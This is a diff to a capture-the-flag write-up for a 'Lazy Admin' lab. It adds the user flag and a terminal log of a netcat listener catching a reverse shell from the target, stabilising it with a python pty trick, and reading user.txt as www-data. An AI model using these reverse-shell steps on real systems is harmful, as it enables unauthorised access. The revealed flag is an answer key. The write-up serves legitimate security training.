@@ -4,6 +4,7 @@
 ####  Lazy Admin
 
 What is the user flag?
+- THM{63e5bce9271952aad1113b6f1ac28a07}
 
 
 What is the root flag?
@@ -160,7 +161,44 @@ We can now look for the reverse_shell.php code on the ip:80/content/inc and unde
 Setup a netcat listener using port 1234, then stabilize the shell, the capture the first flag:
 
 
+```
 
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234                         
+listening on [any] 1234 ...
+connect to [10.4.73.167] from (UNKNOWN) [10.10.35.168] 60604
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 05:17:07 up 18 min,  0 users,  load average: 0.00, 0.05, 0.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@THM-Chal:/$ export TERM=xterm
+export TERM=xterm
+www-data@THM-Chal:/$ ^Z
+zsh: suspended  nc -lnvp 1234
+                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 1234
+
+www-data@THM-Chal:/$ whoami
+www-data
+www-data@THM-Chal:/$ ls
+bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
+boot   etc   initrd.img.old  media       proc  sbin  sys  var
+cdrom  home  lib             mnt         root  snap  tmp  vmlinuz
+www-data@THM-Chal:/$ cd home && ls
+itguy
+www-data@THM-Chal:/home$ cd itguy && ls
+Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
+Documents  Music      Public    Videos     examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+www-data@THM-Chal:/home/itguy$ 
+
+
+```
 
 
 
